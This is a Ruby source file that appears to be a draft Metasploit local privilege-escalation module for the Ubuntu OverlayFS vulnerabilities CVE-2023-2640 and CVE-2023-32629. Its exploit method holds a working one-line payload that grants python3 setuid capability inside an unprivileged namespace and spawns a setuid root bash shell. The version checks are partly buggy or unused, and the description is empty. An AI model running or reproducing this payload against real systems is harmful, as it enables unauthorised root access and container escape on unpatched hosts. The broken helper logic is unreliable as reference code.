class MetasplotModule < Msf::Exploit::Local

  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GameOver(lay) Privilege Escalation and Container Escape',
        'Description' => %q{},
        'License' => MSF__LICENSE,
        'Author' => [
          'g1vi', # PoC
          'h00die', # Module Suggestion
          'gardnerapp', # MsF Module
        ],
        'Platform' => ['linux'],
        'Arch' => [],
        'SessionTypes' => ['shell', 'meterpreter'],
        'DisclosureDate' => '2023-07-26',
        'References' => [
          'https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/',
          'https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629',
          'https://www.cvedetails.com/cve/CVE-2023-2640/',
          'https://www.cvedetails.com/cve/CVE-2023-32629/',
          'https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability'
        ]
      )
    )

    register_options(
      [
        
      ]
    )
  end

  # TODO make check method match Ubuntu version w kernel version
  # v = {ubuntu_version: [kernel kernel kernel]}

  def vunerable_version?
    version = kernel_version

    # Must be Ubuntu 
    fail_with(Failure::NotVulnerable, "Target is not Ubuntu.") unless version =~ /[uU]buntu/ 

    os_release = cmd_exec("cat /etc/os-release")

    release = os_release.scan  /\(\w* \w*\)/ # grab codename i.e. Focal Fossa
   
    # Remove '(' and ')'
    release.delete_prefix!('(').delete_suffix!(')')

    vuln_releases = [
        "Lunar Lobster", # Ubuntu 23.04
        "Kinetic Kudu", # Ubuntu 22.10
        "Jammy Jellyfish", # Ubuntu 22.04 LTS
        "Focal Fossa", # Ubuntu 20.04 LTS 
        "Bionic Beaver", # Ubuntu 18.04 LTS      
    ]

    if !vuln_releases.include? release
        fail_with(Failure::NotVulnerable, "Target is not running a vunerable Ubuntu Version")
    end

  end 

  def vunerable_kernel?
    kernels = %w[6.2.0 5.19.0 5.4.0]

    kernel = kernel_release

    a = kernels.select {|k| kernel.include? k}
    if !a.empty?
        print_status("Vunerable Kernel version detected #{a[0]}")
        true
    else 
        false 
    end 
  end 

  def check
    fail_with(Failure::NotVulnerable, 'Target is not linux') unless session.platform == 'linux'

    # Make sure the kernel version is vunerable
    if !vunerable_kernel?
        fail_with(Failure::NotVulnerable, 'Target does not have a vunerable kernel version') 
    end 
    
  end

  def exploit
    check

    # g1vi 
    cmd_exec("unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;\" && u/python3 -c 'import os;os.setuid(0);os.system(\"cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash\")'")
    
  end

end
